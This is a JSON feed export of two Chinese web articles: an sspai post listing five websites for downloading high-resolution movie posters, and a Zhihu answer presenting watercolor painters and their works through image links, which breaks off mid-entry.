[{"title":"制作自己的电影画廊，试试在这 5 个网站找高清海报","date":"2021-08-07 02:42:55","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>之前一直用的豆瓣记录自己看过的电影、剧集和图书，可是每次想通过一定进阶的检索条件来筛选就会比较麻烦。刚好这个月底开始用 Notion 搭建自己的观影 Gallery，需要收集电影海报作为展示，那就来分享几个可以收集清晰的电影海报的网站。</p>\n<h3>豆瓣</h3>\n<p>🔗<a href=\"https://www.douban.com/\" target=\"_blank\">网站</a></p>\n<p>国内最知名的书影音社交网站，几乎可以说的上是国内 IMDb，你可以查到几乎绝大部分的电影、图书、音乐等信息（<s>别问我那些查不到💢</s>）。当然你也可以找到电影海报、剧照等信息，这也是国内最方便检索到相关信息的网站。但是由于豆瓣的海报和剧照等图片都是由网友上传，所以清晰度需要自己分辨。</p>\n<ul><li>首页搜索电影名，进入电影的详细页面，点击最左侧的海报即可查看豆瓣上所有尺寸的海报。</li></ul>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/06/29/e5925ebfcd7ec520abff881cce935c83.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/29/2091b596d45889f094c3a78ef9297581.png\" alt=\"\"></figure><ul><li>同样你可以在右边查看到不同的分类信息，包含了「剧照-海报-壁纸」等。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/e21f0f17bb2207c1d62a25b2c181d7eb.png\"></figure><ul><li>点击进入单张海报详细页面后，你可以在底部看到查看原图的按钮，之后保存即可。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/b4aafbfcf33dae5865c6a8e67dc0c351.png\"></figure><h3>IMDb（<strong>I</strong>nternet <strong>M</strong>ovie <strong>D</strong>ata<strong>b</strong>ase）</h3>\n<p>🔗<a href=\"https://www.imdb.com/\" target=\"_blank\">网站</a></p>\n<p><strong>互联网电影资料库</strong>（简称 <strong>IMDb</strong>）是一个关于电影演员、电影、电视节目、电视艺人、电子游戏和电影制作小组的在线数据库。拥有非常海量的电影、游戏、电视等各类数据条目，几乎是你能想到的它都有，你没想到的它也有。</p>\n<p>在这个网站下载海报、剧照可谓是当仁不让。不过需要注意的是，这个网站不支持中文检索，所以你如果在首页搜索中文名称会得到 「No results found」 的搜索结果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/3a2a0578d4448ee6f828609dfd1768aa.png\"></figure><p>但是，如果你在谷歌搜索的时候使用 <code>site:imdb.com</code> 作为高级索引格式，那么你输入汉译电影名可能会找到相关条例。（有些中国电影可以通过拼音来查询，比如早就该申遗的「让子弹飞」在 IMDb 可以通过「rang zi dan fei」或「Let the Bullets Fly」都可以搜索到）。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/06/29/5a1f7b12a34a6b8b08de7deccd833fd2.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/29/6c878af748294b035924b465933f1e1a.png\" alt=\"\"></figure><p>和豆瓣类似，你都可以在网页左侧点击海报或者是下方的 Photos 进入图库。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/06/29/ea55dbdb21afa4b369833aeed749269c.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/29/22bbcd746ed80f9525fb08b84f243327.png\" alt=\"\"></figure><p>然后在右侧可以进行筛选海报、剧照或者是演员个人。点击查看海报大图就可以保存了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/75f6551483b99ce2899f002155f8c89b.png\"></figure><h3>IMP Awards</h3>\n<p>🔗<a href=\"http://www.impawards.com/\" target=\"_blank\">网站</a></p>\n<p>IMP Awards 是著名的电影海报网站，甚至每年还会评选最好的和最差的电影海报。里面的电影海报收集的也非常大而全。但是主页嘛，看起来的确有那味了，绿色色调就非常怪诞和复古。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/088e96a468f5880538670d59060dd78e.png\"></figure><p>以「让子弹飞」为例子，搜索它的英文名就能找到这部电影，点开详细页面后。就能看到所有的海报了，清晰度非常高，还是免费的。但是就是单部影片的海报数量较小。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/a0d4e4f4edcbb817ebb93e2dc18df938.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/93009bf7fd7abe16e34774ccd87d82a6.png\"></figure><h3>CineMaterial</h3>\n<p>🔗<a href=\"https://www.cinematerial.com/\" target=\"_blank\">网站</a></p>\n<blockquote><p>CineMaterial is a digital community that aims to create a complete digital archive of movie posters, covers, logo's, key art and more. So far, we have collected over <strong>one million images</strong>.</p></blockquote>\n<p>简单来说：CineMaterial 是一个致力于创建完整的电影海报的数字社区。你可以在里面找到非常多的电影海报、封面和图标。</p>\n<p>输入电影名称就可以找到相关影片，点击进入详细页面后，会有一个 Poster 板块，点击进入后就能看到所有不同尺寸、不同国家的海报。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/9176b29302920ab54604386c877c923d.png\"></figure><p>虽然右边有筛选器 filter 帮助你快速筛查不同的海报，但是此功能只有高级捐赠者和贡献者才能使用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/61dfb613d9407e0fb9836aebe1547a99.png\"></figure><p>而且下载海报也需要捐赠一定的金额来购买。但是尺寸和清晰度的确上升了一个档次。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/f86c1de409d30c2ae745e26edf9700ee.png\"></figure><h3>Apple TV Shows &amp; Movies Artwork Finder</h3>\n<p>🔗<a href=\"https://bendodson.com/projects/itunes-artwork-finder/\" target=\"_blank\">网站</a></p>\n<p>这是一个创作者自己制作的网站，你可以使用这个新的网站查找 iTunes 里的海报和封面。支持 海报图片和高分辨率图片。其中还能下载 Apple TV 的预览图以及透明 Logo 或者是用作社交媒体的 CoverArt 16:9 的照片。但是仅限于 Apple TV 里观看的或购买的影片，你还可以根据需要切换地区来找到一些非全区可看的电影海报。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/06/29/2a7732b0884fb165a27953423bcec1e4.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/29/944aabc19b7d5aeaf88b374473eea377.png\" alt=\"\"></figure><h2>玩法 🥚</h2>\n<p>你可以配合 Notion 做出一个非常好的看的 Gallery 来记录你的电影记录。我目前是豆瓣 + Notion 一起使用来完成整个记录。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/a1b605dd19b96f4f8e0e8346e65d672e.png\"></figure><p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/66664"},{"title":"有哪些值得一看的水彩画？","date":"2021-08-06 23:06:49","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-dad61e25d1df1ff887178b98f766504b_l.jpg?source=8673f162\"><span>Scotty，</span><span>我总能找到些被忽视的珍珠</span>\n<a href=\"https://www.zhihu.com/question/28238234/answer/2027639941\" hidden>阅读原文</a>\n</div>\n<div>\n<p>多图预警，本文共介绍 25 位画家和他们的 232 幅作品；</p>\n<p>这个回答我陆陆续续编写了很久才决定发，</p>\n<p>我个人非常喜欢水彩画，虽然我自己总掌握不好这一材料，</p>\n<p>在大学期间整理电子笔记的过程中，我收集了不少好的水彩作品，</p>\n<p>这些水彩作品是我个人重重筛选之后才保留下来的精华，且风格种类庞杂丰富；</p>\n<p>我从近 500 条笔记中筛选出了 25 位水彩画家和他们的 232 幅作品；</p>\n<p>现在分享给各位，还是老规矩，本回答全篇无水印：</p>\n<p><strong>一、风景类型：</strong><strong>1.缅甸水彩画家，Myoe Win Aung（十二幅）</strong></p>\n<p>炫美的光影，透过 Myoe Win Aung 的作品，他的笔下是注入了情感的，通过它的描绘，你能感受到那个国家的风土人情；</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-a7b45844adb98e5c989610d2d252cb33_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-07d2d65f7025528c5b60b7700226b454_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-b62f24c6c8a386f34c82b444064ee1bd_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-549b2f7b8e9b73f9f9f71c3b41ee3c77_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-5d8c6e783685c642b52dc176648a646e_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-9536285310b7ac03b41750cf2e779946_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-35be518e64890adb0627f46f089853a2_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-65ad19a8364e89358adf590a3312e8e6_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-32d468eb5653925b9b7a8ef35d25b844_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-2348e8bec5f0103df0f4a6ed6d636df6_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-f515648a14d359b29acc36ff3190538c_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>2.英国水彩画家 Ella Du Cane 的日本风情（十五幅）</strong></p>\n<p>我每一次看这组作品都会被惊艳到，很难相信这是一位英国游客画出来的作品；</p>\n<p>水彩画家 Ella Du Cane 出生于英国（1874-1943）,1889 年她的父亲过世后，和她身为作家的姐姐 Florence 周游过中国、日本、埃及、冰岛等国。虽然她是英国人，但她笔下的日本真的画出了一种日式文化的神韵，1893 的她的作品展出后，维多利亚女王表示对她的作品相当感兴趣，同时收藏了她 26 幅作品。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-916d4c25e42ead7dd98782fd5b932b4d_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-2454f55ecfea1e65f974cd1621a62eba_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-a805349c472a413a4e68115d9a2d1e7d_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-e1f918f1c802a7fd47b1d3c00f6a5809_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-99c70ec7c2e2f76535a3ebb882afea2f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-d70665e4ccf60a7d203d11f853b38628_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-913f9b49bb34fb713499f684d512446c_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-9dab9dd06d486546b41cc573a3819867_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-450117b11d565a928f7281aa1c66db41_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-42313053cab87be5f6519b536ad7e72e_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-d5bcee5b95df6fbf69fc2f452cebed5f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-a91d10392ab2f9f211820637ce0dd51e_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-3ead72dc20145353738c150f4e8bc9fe_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-763fcada573bf0b1370da3f1c1b90807_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-e7b5fd5409ce055b62bc07d9d4c537e9_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>3.日本水彩画家 Abe Toshiyuki 的宁静森林（十幅）</strong></p>\n<p>清新、温暖、美好，光感很强 技法细腻到位 整体氛围控制得很好；</p>\n<p>该画家最开始是美术机构的教师，业余时间是一位摄影爱好者，多年的摄影爱好和职业经历使得他沉淀出如此丰硕的成果。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-46b48e8c0e8b42b1c1f8f05906a628a7_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-d7d332e5e7c4a63ab70acf91aecb91c8_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-eedbd69553c84c39d3cd4acca90a3d3f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-0ebaa61af2882fcdabd70dcb1a587f8e_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-26079bc61ccd55177564f40df758a73d_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-6b8af2623dd20adfb7264331ecfd53db_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-45675cc627f6246c20c65b49da58c508_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-1c4e093c88e5851cdd1e2be09f2a4e86_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-ad9015f33abf0317bab5fb5953312880_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-757b4514f560460965b4004ba3f39b89_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><br>4.Naomi Tydeman 的清冷水面（八幅）</strong></p>\n<p>Naomi Tydeman 是一个自学成才的水彩画家，她的作品给我的感觉非常冷寂，我很享受那股沉浸其中的感受，我认为她的作品达到了某种理想化的完美；</p>\n<blockquote>“水彩不断地带给我惊喜。它变幻莫测、自然流露、自成一体、坚决果敢、随心所欲，所以你必须时刻保持清醒——干脆地作出决定，勇于冒险，无畏失去。接受它带给你的东西并去控制它。放手去画，用心观察，充分把握当时的情境。” ——Naomi Tydeman</blockquote>\n<figure><img src=\"https://pic3.zhimg.com/v2-2fee834010780284750700129049882c_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-aadbffe2d6f3600dd0e88c6dd9de80b9_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-4e6bd5db6b88b80d20811570b588a3d6_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-56501b365c35795d1cc8fc4cabe33d25_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-f5a79b61cfa84404c8f3b0679ddd2187_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-319b101b666231a29a07c40a02d8ff28_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-7a2dbeb8e256203600eec305f3d8efd9_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-138799fa35b4865ffc45c609887d3948_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>5.美国水彩画家<strong>kris parins 的户外写生（十一幅）</strong></strong></p>\n<p>我太喜欢他这两张船的作品了，温情午后，美不胜收，他很擅长画室外暖光，在用色上非常大胆，有些近乎于插画式配色的呈现；</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-a93b967be27d1420886f963600497ee1_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-f04c3d1cb44ebb0b95274268a9d2781b_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-328d16bae52a026f58411c20d0725098_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-a49250a7adac4243b54b09fff93218b7_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-1de2f9c86fb7c53beeeb36997343b23a_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-bf282b27d473c47d17a230ef9f7a419c_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-b569e500b75ceb6c53082cbc46db7ee9_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-0e8b4972914413c84c48f965c4130830_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-6f8c853ad63cfc9bb8c7f9cb74528fa7_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-7cb36dad4885892f52ae62d1e737ac76_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-7092049442d74f72a3da70174aa0ba5c_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><br> 6.Thomas W Schaller 的建筑水彩画（五幅）</strong></p>\n<blockquote>Thomas W. Schaller 是美国纽约的一位专职水彩画家，有着 20 年的建筑师和建筑艺术家的职业生涯，他长期以来一直被认为是世界上最重要的建筑艺术家之一。</blockquote>\n<p>对于他的作品，我个人只放上我喜欢的五幅，虽然他名声在外，但是我个人不喜欢那种大面积的受光面留白表现的作画方式</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b4aa98e91545b6659fb2ef3a65cdc653_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-e3ec6750d0b89d72279b49bde1a02e30_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-87e590783f156bded35d3ca38386b096_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-f20700e20e2639e4cc70aaec0016dee5_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-ea72249cc6d65bae0a744b9e158563ea_720w.jpg?source=8673f162\" alt=\"\"></figure><p>我个人不喜欢他下面这种大面积的受光面留白的画面：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-79413c0ffdd46e81000b15eac3155070_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>7.英国画家 Charles Villeneuve 的建筑水彩画（八幅）</strong></p>\n<p>Charles Villeneuve，出生于 1971 年，法国水彩画家、建筑设计师，他的水彩画多以欧洲的城市风光为主，</p>\n<p>Charles Villeneuve 刻意去用水彩营造出一股清冷雾朦的氛围，这种用色反而接近了我们印象中的真实，建筑绘画中对于细节的取舍其实是成败的关键，Charles Villeneuve 这一块的节奏处理感比较好，用色调去做整体的大的光影区分，再用独到的笔触去丰富里面的细节，既完整又不失细节，简单的用色，但画面的确让人眼前一亮；</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-fbe65fdc5ad7be6865a35d8caad3d396_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-15f5cb5e7cada5e590084f94d225df0d_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-690b16d45188fa5563d5a014099a99c0_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-ad7e340500f834c57afe7d8fbb7ef22f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-86703dba47de7a595e06e0a61e5c9fef_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-34a3fcd804a98e0ccbe109d1a2f2c5d2_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-d2cee5484642980328c58a7ceb98021b_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-28d373ab919720f21b69dc0dddea40bc_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>二、黑白单色类型：</strong><strong>8.日本插画师辻恵 Tsuji Megumi（九幅）</strong></p>\n<p>我太喜欢这个舞者系列的作品了，这个画面构思太巧妙了，优雅内敛，你仿佛只能看到自己的内心，你仿佛在与自己的内心对话；</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-719930267c3bb1d5ddf37db9fa58f4bb_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-2f5431e743de63a429a981f1b495217d_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-48e574b262e7460293544286550705e6_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-f70848efdcc8f0bde926cebb20908403_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-14c8d3c6cfe15eb26899b8dd10ff4a8e_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-dc912fda3a8b9d8462cbe8e57c2fa266_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-ef8047db6544aa2b7c2cac9c741ef259_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-8183582660c061ff1ef88af84436d310_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-493fce67bcf1af4420f336044e0b772f_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><strong>9.印尼水彩画家 Elicia Edijanto（八幅）</strong></strong></p>\n<p>她的作品多以人与动物为视觉主体，更多的是探讨和表达人与其它生灵之间的内在关系；</p>\n<blockquote>运用黑色水彩（多数时候），努力创作出人和自然的独特关系。我的作品主题基本都是孩子和动物，因为他们忠诚、真挚、毫无偏见且朴实无华。人们更容易体会到他们的感情。它们给了我太多特殊情感或氛围，宁静、庄重，还有纵容和自由，这些东西抚慰了我的悲伤和痛苦。——Elicia Edijanto</blockquote>\n<figure><img src=\"https://pic2.zhimg.com/v2-a05cf18aafed1ffa83cd78a0fe86a32a_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-c12441be619215c1886e5a2e5ff718be_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-3f4dc991db39e3401bb5a8be7e83fa18_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-104f3c102d7b7c792161d00a63e61cae_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-9534446b69eabdde4cde27fac04f494e_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-0c3f8c42ffbbc2f98991263ad0ad1d27_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-957949450e45344725a0d225ab801ab6_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-ea75116ea433df233f972c2bde7ada20_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>三、动物类别：</strong><strong>10.Karl Martensn 的水彩鸟类（九幅）</strong></p>\n<p>Karl Martens 于 1956 年出生在旧金山，由于在他成长过程中受东方和西方哲学以及佛教等思想的影响，他画的这些水彩画融入了中国水墨和禅宗的理念，他个人访谈中提及他的作品是受到了石涛的影响；</p>\n<p>在我个人看来他的作品还是没有挣脱出看郎世宁画的那种感觉，虽然作者受到中国水墨的影响，但并没有触及到中国传统艺术内蕴的核心，但总归而言，这与最终呈现的视觉效果无关，仍然是非常好的水彩作品；</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-ce49b9d9b0fea2d889c077d174322e10_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-50de5ade8e3ac75dab131a89223ca421_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-0ad62723e6cb0ba1e669b30ee9b622b5_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-f22b0c73f2493a707fbda94f6720eb30_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-a92a05753436d17ac990809fc482d525_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-3fa34e7431f24878067c951b76b7b65d_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-4ad26eda2f7114b6ff1115ebc4253191_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-1189147d13d2e5e64ea89a48b8d07275_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-b4e55fad565b0a6a7d8bf8ca07d434df_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>11.Jake Winkle 悦动色彩（十四幅）</strong></p>\n<p>我很喜欢有篇文章对于他的作品评价，轻盈且疯狂，色彩使用的明度相当高，用色大胆迷幻，初看时很惊艳，但也很耐看，我认为他的作品触及了水彩技法的核心，这是只有水彩才能创造出的作品；</p>\n<figure><img src=\"https://pica.zhimg.com/v2-dc061277e79d5eef52b10c1fd097ca22_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-46357a027433bb3ba5c01df37e279c24_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-18142e87a9ff3b6ec918ad9b297b957c_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-0c41bfa3f5754900e340b81a0347db6f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-411466e7a7d07cdc2e23f2efdc3d1e5b_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-dc79e08950b68960126e7a7c896bd51a_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-1e9d56eede3b4c32fe4aa5d83036bb7b_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-e6bfd643badd6e5de5d084fa41ef9545_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-1832f1f4bfc57f108997894a944ba3cb_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-61cb8f5cef8ed1415882c904ba3d250b_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-cdd9dadf5001c7cf4f9b41abfcaabdb4_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-1225bf4160123b343b6b87acf9f961f1_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-b96de0726fee3a271f8be9a2aa7247ad_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-b974fb4a7ccd8ee7a33d226b18684de6_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>12.日本画家 Yutaka Murakami 画笔下的猫咪（十幅）</strong></p>\n<p>因为我在养一只银渐层，所以我太理解这些画面中的体态表情有多么传神了；</p>\n<p>利用水彩特性结合略微写意的表现手法，将猫咪的种种体态和心情生动地体现了出来，整体技法张弛有度，松紧结合，很有画味且富于节奏感；</p>\n<p>我愿称他为画猫第一人；</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b3db3ad91905678d0b64552a3fc4c95c_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-640971a74f0695a5dbfe3b2c652d1a38_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-43441478f67a1d87ee936727b6776749_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-80a82d0572fe17886b8698d66c785e8d_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-9a7d11399f1204bacd404906fe884e2c_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img 